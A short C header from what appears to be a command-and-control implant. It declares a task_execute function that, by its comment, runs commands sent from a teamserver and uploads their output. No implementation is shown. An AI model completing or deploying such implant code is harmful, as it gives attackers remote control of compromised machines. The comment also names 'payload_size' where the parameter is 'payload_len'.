#ifndef C2_IMPLANT_TASKS_H
#define C2_IMPLANT_TASKS_H

#include <stddef.h>

#include "config.h"

/* Run the command the teamserver sent and upload what it printed. The payload
   is payload_size bytes with no terminator; it is not modified. */
void task_execute(const struct target_config *target, const char *payload,
                  size_t payload_len);

#endif
